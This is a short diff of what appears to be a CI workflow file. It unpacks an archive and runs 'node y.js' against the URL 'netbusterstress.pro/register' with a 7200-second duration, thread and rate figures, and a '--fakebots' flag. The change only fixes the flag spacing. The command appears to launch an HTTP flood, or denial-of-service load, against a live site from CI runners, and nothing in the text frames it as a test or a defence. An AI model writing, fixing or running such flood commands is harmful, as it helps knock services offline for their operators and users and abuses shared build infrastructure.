@@ -35,7 +35,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET https://netbusterstress.pro/register 7200 4 90  --fakebots--debug  --full
+          node y.js GET https://netbusterstress.pro/register 7200 4 90  --fakebots --debug  --full
 
           
           
